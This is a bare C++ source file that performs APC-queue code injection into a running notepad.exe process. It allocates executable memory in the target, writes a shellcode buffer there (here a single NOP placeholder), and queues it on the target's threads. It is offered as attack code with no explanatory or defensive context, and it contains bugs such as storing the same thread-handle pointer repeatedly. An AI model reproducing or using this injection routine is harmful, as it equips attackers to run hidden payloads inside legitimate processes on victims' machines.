#include <Windows.h>
#include <TlHelp32.h>
#include <stack>

// shellcode
unsigned char buf[] = { 0x90 };

typedef std::stack<HANDLE*> THREAD_STACK;
typedef THREAD_STACK* PTHREAD_STACK;

int main() {
	HANDLE hProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	SIZE_T shellSize = sizeof(buf);
	HANDLE hThread = NULL;
	HANDLE hSnapshot = NULL;
	LPVOID lpShellAddress = nullptr;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL) {
		return 1;
	}
	
	if (Process32First(hSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0) {
			Process32Next(hSnapshot, &processEntry);
		}
	}
    else {
		return 1;
	}

	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, 0, processEntry.th32ProcessID);
	lpShellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)lpShellAddress;
	WriteProcessMemory(hProcess, lpShellAddress, buf, shellSize, NULL);

	PTHREAD_STACK lpThreads = new THREAD_STACK();
	do {
		if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
			hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadEntry.th32ThreadID);
			if (hThread != NULL) {
				lpThreads->push(&hThread);
			}
		}
	} while (Thread32Next(hSnapshot, &threadEntry));

	while (!lpThreads->empty()) {
		hThread = *lpThreads->top();
		QueueUserAPC((PAPCFUNC)lpShellAddress, hThread, NULL);
		CloseHandle(hThread);
		Sleep(200);
		lpThreads->pop();
	}

	delete lpThreads;
	lpThreads = nullptr;
	CloseHandle(hProcess);
    CloseHandle(hSnapshot);

	return 0;
}
